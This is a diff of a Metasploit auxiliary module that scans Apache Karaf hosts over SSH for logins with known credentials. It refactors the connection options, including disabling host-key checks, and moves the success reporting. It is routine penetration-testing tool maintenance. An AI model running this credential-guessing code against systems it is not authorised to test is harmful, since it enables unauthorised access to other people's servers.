@@ -1,14 +1,14 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
 require 'net/ssh'
 
 class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Scanner
   include Msf::Auxiliary::Report
+  include Msf::Exploit::Remote::SSH
 
   def initialize(info={})
     super(update_info(info,
@@ -25,13 +25,8 @@ class MetasploitModule < Msf::Auxiliary
         ],
       'Platform'       => 'unix',
       'Arch'           => ARCH_CMD,
-      'Targets'        =>
-        [
-          ['Apache Karaf', {}],
-        ],
       'Privileged'     => true,
-      'DisclosureDate' => "Feb 9 2016",
-      'DefaultTarget'  => 0))
+      'DisclosureDate' => "Feb 9 2016"))
 
     register_options(
       [
@@ -68,24 +63,28 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def do_login(user, pass, ip)
+    factory = ssh_socket_factory
     opts = {
-      :auth_methods => ['password'],
-      :msframework  => framework,
-      :msfmodule    => self,
-      :port         => rport,
-      :disable_agent => true,
-      :config => false,
-      :password => pass,
-      :record_auth_info => true,
-      :proxies => datastore['Proxies']
+      :auth_methods    => ['password'],
+      :port            => rport,
+      :config          => false,
+      :use_agent       => false,
+      :password        => pass,
+      :proxy           => factory,
+      :non_interactive => true,
+      :verify_host_key => :never
     }
 
-    opts.merge!(:verbose => :debug) if datastore['SSH_DEBUG']
+    opts.merge!(verbose: :debug) if datastore['SSH_DEBUG']
 
     begin
-      ssh = nil
-      ::Timeout.timeout(datastore['SSH_TIMEOUT']) do
-        ssh = Net::SSH.start(ip, user, opts)
+      ssh = ::Timeout.timeout(datastore['SSH_TIMEOUT']) do
+        Net::SSH.start(ip, user, opts)
+      end
+      if ssh
+        print_good("#{ip}:#{rport} - Login Successful ('#{user}:#{pass})'")
+      else
+        print_error "#{ip}:#{rport} - Unknown error"
       end
     rescue OpenSSL::Cipher::CipherError => e
       print_error("#{ip}:#{rport} SSH - Unable to connect to this Apache Karaf (#{e.message})")
@@ -105,11 +104,6 @@ class MetasploitModule < Msf::Auxiliary
       return
     end
 
-    if ssh
-      print_good("#{ip}:#{rport}- Login Successful with '#{user}:#{pass}'")
-    else
-      print_error "#{ip}:#{rport} - Unknown error"
-    end
     ssh
   end
 
